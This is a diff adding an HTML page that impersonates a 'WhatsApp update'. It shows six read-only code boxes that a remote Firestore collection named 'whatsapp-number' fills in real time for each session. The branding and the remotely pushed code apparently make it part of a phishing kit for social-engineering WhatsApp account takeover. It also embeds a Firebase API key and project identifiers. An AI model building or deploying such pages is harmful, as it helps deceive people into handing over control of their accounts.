@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Code Update</title>
+  <style>
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 50px;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 60px;
+      text-align: center;
+      font-size: 28px;
+      border-radius: 10px;
+      border: 2px solid #ccc;
+      background-color: #f9f9f9;
+    }
+  </style>
+</head>
+<body>
+  <h2 style="text-align:center;">Update WhatsApp</h2>
+  <div class="otp-container">
+    <input class="otp-input" id="box1" readonly>
+    <input class="otp-input" id="box2" readonly>
+    <input class="otp-input" id="box3" readonly>
+    <input class="otp-input" id="box4" readonly>
+    <input class="otp-input" id="box5" readonly>
+    <input class="otp-input" id="box6" readonly>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.appspot.com",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const sessionId = sessionStorage.getItem("sessionId");
+
+    if (!sessionId) {
+      alert("Session ID missing!");
+    } else {
+      db.collection("whatsapp-number").doc(sessionId)
+        .onSnapshot(doc => {
+          const data = doc.data();
+          if (data && data.boxes) {
+            data.boxes.forEach((val, i) => {
+              const el = document.getElementById(`box${i + 1}`);
+              if (el) el.value = val;
+            });
+          }
+        });
+    }
+  </script>
+</body>
+</html>
